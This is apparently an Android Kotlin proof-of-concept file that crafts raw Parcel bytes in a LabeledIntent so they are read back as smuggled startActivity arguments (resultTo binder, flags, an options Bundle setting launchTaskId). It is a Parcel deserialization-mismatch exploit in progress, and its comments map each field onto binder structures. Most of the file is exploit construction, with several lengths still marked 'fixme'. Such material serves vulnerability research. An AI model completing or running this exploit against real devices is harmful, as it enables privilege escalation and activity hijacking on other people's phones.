@file:OptIn(ExperimentalUnsignedTypes::class)
@file:SuppressLint("Recycle")

package play.ground

import android.annotation.SuppressLint
import android.app.ActivityOptions
import android.app.ProfilerInfo
import android.content.Intent
import android.content.pm.LabeledIntent
import android.os.Build
import android.os.Bundle
import android.os.Parcel
import android.util.Log
import androidx.annotation.RequiresApi
import androidx.appcompat.app.AppCompatActivity
import org.jetbrains.anko.button
import org.jetbrains.anko.intentFor
import org.jetbrains.anko.sdk27.coroutines.onClick
import org.jetbrains.anko.verticalLayout

fun UInt.repeat(n: Int) = UByteArray(n) { this.toUByte() }
fun <T> fixme(value: T) = value

const val ValByteArray = 13


class IndexActivity : AppCompatActivity() {
  companion object {
    private const val TAG = "Decay"
  }

  @RequiresApi(Build.VERSION_CODES.TIRAMISU)
  override fun onCreate(savedInstanceState: Bundle?) {
    super.onCreate(savedInstanceState)
    verticalLayout {
      button("payload for intent") {
        onClick {

          val intent = Parcel.obtain().apply {
            intentFor<MainActivity>().writeToParcel(this, 0)
          }

          val tail = Parcel.obtain().apply {
            writeString(null) // mSourcePackage => resolvedType
            writeInt(0) // labelRes  => hdr
            writeInt(0) // kind1 => flags
            writeString8("AAA") // text => binder
            writeInt(11) // alignment => cookie.1
            run {
              writeInt(fixme(65)) // span text len => cookie.2
              writeInt(65)  // p.12 => representation
              writeString(null) //  p.34 => resultWho(null)
              writeInt(0) // p.56 => requestCode
              writeInt(0) // p.78 => flags
              writeInt(0) // p.90 => profilerInfo(null)
              run {
                writeInt(1) // options != null
                writeInt(fixme(100)) // back patch length
                writeInt(0x4C444E42) // 'B' 'N' 'D' 'L'
                writeInt(2) // entry count
                writeString("android.activity.launchTaskId") // key 1
                writeValue(1) // value 1
                writeString("_") // key 2
                run {  // value 2
                  writeInt(13) // VAL_BYTEARRAY
                  writeInt(fixme(70)) // byte array length
                  writeInt('@'.code)
                  writeInt(0) // nil
                }
              }

              writeInt(0) // span.start
              writeInt(1) // span.end
              writeInt(0) // span.flags
              writeInt(0) // end flag
            }
            writeInt(0) // Icon
          }


          val labeled = Parcel.obtain().apply {
            appendFrom(intent, 0, intent.dataSize())
            appendFrom(tail, 0, tail.dataSize())
          }

          val restore = LabeledIntent.CREATOR.createFromParcel(labeled)
          labeled.enforceNoDataAvail()


          tail.setDataPosition(0)
          val resolvedType = tail.readString()
          val resultTo = tail.readStrongBinder()
          val resultWho = tail.readString()
          val requestCode = tail.readInt()
          val startFlag = tail.readInt()
          val profiler = tail.readTypedObject(ProfilerInfo.CREATOR)
          val options = tail.readTypedObject(Bundle.CREATOR)

          Log.i(
            TAG,
            "resolvedType:$resolvedType, resultTo:$resultTo resultWho: $resultWho, requestCode:$requestCode startFlag:$startFlag profiler:$profiler, options:$options"
          )

          assert(ActivityOptions.fromBundle(options).launchTaskId == 1)


        }
      }
    }
  }


  /* the autonomy of `startActivity` call
  ```java
  int _result = this.startActivity(
    caller,
    callingPackage,
    callingFeatureId,
    intent,
      {
        mSourcePackage@String, -> resolvedType
        mLabelRes@Int, -> hdr
        kind1@i32=0, -> flags
        String8@{
          len@Int=3 -> binder.1
          'AAA\nil' -> binder.2 ->  'AAA'
        }
        kind2@i32=1(ALIGNMENT_SPAN), -> cookie.1
        String16@{
         len = ?65 -> cookie.2 // (132-2)/2 = 65
         'AB' -> representation
          -1 -> resultWho@String,
          0 -> requestCode@i32,
          0 -> flags@i32,
          0 -> profilerInfo=null,
          options@Bundle = {
            launchTaskId = 1,
             _ = byteArray {
              len = ?, // **68**
              '@@@nil'
             }
          }
        }

        span.start -> i32
        span.end -> i32
        span.flag -> i32
      }
    resolvedType@String=null,
    resultTo@binder=null{
      hdr@i32,
      flags@i32,
      binder@i64,
      cookie@i64,
      representation@i32
    },
    resultWho@String=null,
    requestCode@Int=2,
    flags@Int=0,
    profilerInfo@ProfilerInfo=null,
    options@Bundle=null
  );
  ```
  */


  /* the autonomy of `startActivity` call

  ```java
  int _result = this.startActivity(
    caller,
    callingPackage,
    callingFeatureId,
    intent,
      {
        mSourcePackage@String, -> resolvedType
        mLabelRes@Int, -> hdr
        _type@Int=1, -> flags
        String8@{
          ?len@Int=???, -> binder.1
          payload=bytes, binder.2, cookie, representation, resultWho, requestCode, flags, profilerInfo
            , options@{launchTaskId = 1, _ = byteArray@?len?(
            '@','@', '@', nil=?, ?paddings
            )
        }
      }
    resolvedType@String=null,
    resultTo@binder=null{
      hdr@i32,
      flags@i32,
      binder@i64,
      cookie@i64,
      representation@i32
    },
    resultWho@String=null,
    requestCode@Int=2,
    flags@Int=0,
    profilerInfo@ProfilerInfo=null,
    options@Bundle=null
  );
  ```
  */

  /* the autonomy of flatten binder
  ```cpp
  struct flat_binder_object  {
    struct binder_object_header hdr;
    u32 flags;
    union {
      u64 binder;
      u32 handle;
    }
    u64 cookie
  }
  ```
  */


  private fun decay() {
    val prologue = Parcel.obtain().apply {
      // Span.str.payload.0123 -> resultTo.binder.2@i32
      writeInt(0)

      // Span.str.payload.4567_8901 -> resultTo.binder.cookie@i64
      writeInt(0)
      writeInt(0)

      // Span.str.payload2.2345 -> resultTo.binder.representation
      writeInt(0)
    }

    val epilogue = Parcel.obtain().apply {
      writeInt(0) // i32@LabeledIntent.mIcon
      writeString(null) // resolvedType
      writeStrongBinder(null) // resultTo
      writeString(null) // resultWho
      writeInt(2) // requestCode
      writeTypedObject(null, 0) // profilerInfo
      writeTypedObject(null, 0) // options
    }

    val epilogueLength = epilogue.dataPosition()

    val `span$options$map` = Parcel.obtain().apply {
      writeInt(2) // entry size
      writeString("android.activity.launchTaskId") // first key
      writeValue(1)
      writeString("?")
      writeInt(ValByteArray)
      writeInt(fixme(epilogueLength)) // length of epilogue
    }

    val `span$options$meta` = Parcel.obtain().apply {
      writeInt(1) // options != null
      writeInt(fixme(`span$options$map`.dataPosition() + epilogueLength)) // back-patched length
      writeInt(0x4C444E42) // BNDL
    }

    val span = String(
      Parcel.obtain().apply {
        appendFrom(
          prologue,
          0,
          prologue.dataSize()
        ) // (binder.binder.2 ... binder.representation) => resultTo

        writeString(null) // resultWho
        writeInt(-1) // requestCode
        writeInt(Intent.FLAG_ACTIVITY_NEW_TASK) // flags
        writeTypedObject(null, 0) // profilerInfo
        writeTypedObject(null, 0) // options

        // other
        appendFrom(`span$options$meta`, 0, `span$options$meta`.dataSize())
        appendFrom(`span$options$map`, 0, `span$options$map`.dataSize())
      }.marshall()
    )

    Log.e(TAG, "natsuki: span -> $span")
  }

  fun handcrafted() {
    val parcel = Parcel.obtain().apply {
      val intent = intentFor<IndexActivity>()
      writeParcelable(intent, 0)
      writeString(null) // resolvedType -> mSourcePackage
      writeInt(0) //  mLabelRes -> hdr
      writeInt(1) // _type  -> flags
      writeInt(fixme(100)) // string length -> binder.1
      writeInt(0) //  -> binder.2
      writeInt(0) // cookie
      writeInt(0) // cookie
      writeInt(0) // representation
    }
  }
}



